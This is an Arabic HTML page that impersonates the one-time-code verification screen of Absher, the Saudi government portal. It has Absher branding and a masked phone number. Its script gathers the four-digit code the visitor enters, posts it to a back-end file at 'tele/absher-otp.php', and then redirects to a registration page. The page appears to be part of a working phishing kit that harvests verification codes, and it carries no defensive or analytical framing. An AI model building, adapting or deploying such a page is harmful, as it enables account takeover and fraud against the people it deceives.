<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق - أبشر</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
        }

        .logo-image {
            max-width: 180px;
            height: auto;
        }

        h1 {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 15px;
            font-weight: 600;
            text-align: center;
        }

        .subtitle {
            color: #5a6c7d;
            font-size: 14px;
            margin-bottom: 10px;
            line-height: 1.6;
            text-align: center;
        }

        .phone-number {
            font-size: 18px;
            color: #2c3e50;
            font-weight: 600;
            margin-bottom: 40px;
            letter-spacing: 2px;
            text-align: center;
        }

        .otp-container {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 40px 0;
            direction: ltr;
        }

        .otp-input {
            width: 60px;
            height: 2px;
            font-size: 28px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #333;
            outline: none;
            background: transparent;
            transition: all 0.3s ease;
            font-weight: 600;
            color: #2c3e50;
            padding: 10px 0;
        }

        .otp-input:focus {
            border-bottom-color: #4CAF50;
        }

        .submit-btn {
            display: block;
            margin: 40px auto 0;
            padding: 14px 60px;
            background: #ffffff;
            color: #4CAF50;
            border: 2px solid #4CAF50;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .submit-btn:hover {
            background: #f0f9f0;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .submit-btn:disabled {
            background: #f5f5f5;
            color: #cccccc;
            border-color: #cccccc;
            cursor: not-allowed;
        }

        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 20px;
            display: none;
            text-align: center;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4CAF50;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .otp-input {
                width: 50px;
                font-size: 24px;
            }

            .otp-container {
                gap: 15px;
            }

            .submit-btn {
                padding: 12px 50px;
            }
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="header-logo.png" alt="أبشر" class="logo-image">
    </div>

    <h1>رمز التحقق</h1>
    <p class="subtitle">الرجاء إدخال رمز التأكيد الذي تم إرساله على الجوال</p>
    <p class="phone-number">********05</p>

    <form id="otpForm">
        <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off">
        </div>

        <button type="submit" class="submit-btn" id="submitBtn">متابعة</button>
        
        <div class="error-message" id="errorMessage">
            رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.
        </div>

        <div class="loading" id="loading">
            <div class="spinner"></div>
        </div>
    </form>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const form = document.getElementById('otpForm');
        const submitBtn = document.getElementById('submitBtn');
        const errorMessage = document.getElementById('errorMessage');
        const loading = document.getElementById('loading');

        // التنقل التلقائي بين الحقول
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                
                // السماح بالأرقام فقط
                if (!/^[0-9]$/.test(value)) {
                    e.target.value = '';
                    return;
                }

                // الانتقال للحقل التالي
                if (value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }

                // إخفاء رسالة الخطأ
                errorMessage.style.display = 'none';
            });

            // حذف الرقم والرجوع للحقل السابق
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });

            // لصق الكود كاملاً
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text').trim();
                const digits = pastedData.match(/\d/g);
                
                if (digits) {
                    digits.slice(0, 4).forEach((digit, i) => {
                        if (inputs[i]) {
                            inputs[i].value = digit;
                        }
                    });
                    inputs[Math.min(digits.length, 3)].focus();
                }
            });
        });

        // إرسال النموذج
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // جمع رمز التحقق
            const otp = Array.from(inputs).map(input => input.value).join('');
            
            // التحقق من اكتمال الرمز
            if (otp.length !== 4) {
                errorMessage.textContent = 'الرجاء إدخال رمز التحقق كاملاً';
                errorMessage.style.display = 'block';
                return;
            }

            // عرض التحميل
            submitBtn.disabled = true;
            loading.classList.add('active');
            errorMessage.style.display = 'none';

            try {
                // إرسال البيانات - تم تعديل اسم المتغير
                const response = await fetch('tele/absher-otp.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `otp_code=${otp}` // ✅ تم التعديل هنا
                });

                const result = await response.text();

                // معالجة الاستجابة
                if (response.ok) {
                    console.log('تم الإرسال بنجاح');
                    // سيتم التوجيه من ملف PHP
                    window.location.href = '../register.php';
                } else {
                    throw new Error('فشل الإرسال');
                }
            } catch (error) {
                errorMessage.textContent = 'حدث خطأ. الرجاء المحاولة مرة أخرى.';
                errorMessage.style.display = 'block';
                
                inputs.forEach(input => input.value = '');
                inputs[0].focus();
            } finally {
                loading.classList.remove('active');
                submitBtn.disabled = false;
            }
        });

        // التركيز على الحقل الأول عند تحميل الصفحة
        window.addEventListener('load', () => {
            inputs[0].focus();
        });
    </script>
</body>
</html>